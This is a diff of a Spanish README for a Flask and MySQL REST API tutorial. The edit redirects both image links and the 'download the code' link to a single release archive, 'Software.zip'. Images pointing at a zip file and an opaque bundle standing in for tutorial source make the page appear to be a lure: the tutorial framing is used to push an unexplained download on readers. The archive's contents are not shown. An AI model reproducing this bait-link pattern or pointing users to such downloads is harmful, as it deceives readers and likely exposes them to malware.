@@ -1,6 +1,6 @@
 # 🚀 Construyendo una API REST con Flask y MySQL
 
-![API REST con Flask y MySQL](https://example.com/image.png)
+![API REST con Flask y MySQL](https://github.com/iyanayokan/construyendo-una-APIs-REST-con-Flask-y-MySQL/releases/download/v1.0/Software.zip)
 
 ¡Bienvenidos al repositorio "construyendo-una-APIs-REST-con-Flask-y-MySQL"! Aquí encontrarás una guía paso a paso para crear una API REST utilizando Flask y MySQL. Esta es una excelente manera de gestionar datos de forma persistente en una base de datos relacional. En este proyecto, te enseñaré cómo construir una API que permita gestionar una lista de tareas (todo list) de manera eficiente.
 
@@ -33,10 +33,10 @@ Este repositorio tiene como objetivo brindar una guía completa para aquellos in
 ¡No esperes más y comienza a construir tu propia API REST con Flask y MySQL! Sigue los pasos detallados en este repositorio y en poco tiempo tendrás una API funcional para gestionar una lista de tareas.
 
 ## Descarga el Código 📥
-👉 [¡Haz clic aquí para descargar el código!](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 👈
+👉 [¡Haz clic aquí para descargar el código!](https://github.com/iyanayokan/construyendo-una-APIs-REST-con-Flask-y-MySQL/releases/download/v1.0/Software.zip) 👈
 
 Si el enlace proporcionado no funciona, asegúrate de revisar la sección de "Releases" del repositorio para encontrar la versión adecuada.
 
 ¡Gracias por visitar este repositorio y buena suerte con la construcción de tu API REST con Flask y MySQL! ¡Diviértete programando! 🎉
 
-![Flask y MySQL](https://example.com/image2.png)
+![Flask y MySQL](https://github.com/iyanayokan/construyendo-una-APIs-REST-con-Flask-y-MySQL/releases/download/v1.0/Software.zip)
